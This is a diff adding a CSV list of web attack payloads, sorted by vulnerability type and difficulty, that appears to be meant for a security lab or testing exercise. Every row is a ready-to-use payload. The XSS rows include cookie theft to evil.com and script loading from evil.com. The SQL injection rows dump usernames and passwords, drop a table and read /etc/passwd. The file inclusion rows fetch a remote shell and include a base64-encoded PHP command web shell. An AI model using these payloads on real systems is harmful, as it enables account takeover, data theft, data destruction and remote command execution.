@@ -1,0 +1,25 @@
+Vulnerability,Type,Level,Payload
+XSS,Reflected,Low,"<script>alert(""XSS"")</script>"
+XSS,Reflected,Medium,https://example.com/search?q=<img src=x onerror=alert('Reflected XSS - Medium')>
+XSS,Reflected,High,https://example.com/search?q=%3Cscript%3Efetch('https://evil.com/steal?cookie='+document.cookie)%3C%2Fscript%3E
+XSS,Stored,Low,"<script>alert(""XSS"")</script>"
+XSS,Stored,Medium,"<img src=x onerror=""alert('Stored XSS - Medium')"">"
+XSS,Stored,High,<svg><script>alert('Stored XSS - Hard')</script></svg>
+XSS,DOM-based,Low,http://example.com/#<script>alert('XSS')</script>
+XSS,DOM-based,Medium,"<input id=""input1"" onblur=""document.body.innerHTML += '<img src=x onerror=alert(1)>'"">"
+XSS,DOM-based,High,"<input id=""input1"" onblur=""document.body.appendChild(document.createElement('script')).src='https://evil.com/payload.js'"">"
+SQLI,Boolean-Based (blind),Low,1' OR '1'='1
+SQLI,Boolean-Based (blind),Medium,1' OR SLEEP(5)--
+SQLI,Boolean-Based (blind),High,"1' UNION SELECT 1,2,3--"
+SQLI,Error-Based (in band),Low,1'; SELECT * FROM users WHERE id=1--
+SQLI,Error-Based (in band),Medium,1' OR 1=1; DROP TABLE users--
+SQLI,Error-Based (in band),High,1' AND 1=(SELECT COUNT(*) FROM tabname);--
+SQLI,Union-Based (inband),Low,"1' UNION SELECT 1,2,3--"
+SQLI,Union-Based (inband),Medium,"1' UNION SELECT NULL,username,password FROM users--"
+SQLI,Union-Based (inband),High,"1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--"
+File inclusion,Remote File Inclusion (RFI),Low,http://example.com/index.php?page=http://evil.com/shell.txt
+File inclusion,Remote File Inclusion (RFI),Medium,"http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+File inclusion,Remote File Inclusion (RFI),High,http://example.com/index.php?page=php:expect://id
+File inclusion,Local File Inclusion (LFI),Low,http://example.com/index.php?page=etc/passwd
+File inclusion,Local File Inclusion (LFI),Medium,http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+File inclusion,Local File Inclusion (LFI),High,http://example.com/index.php?page=path/to/uploaded/file.png
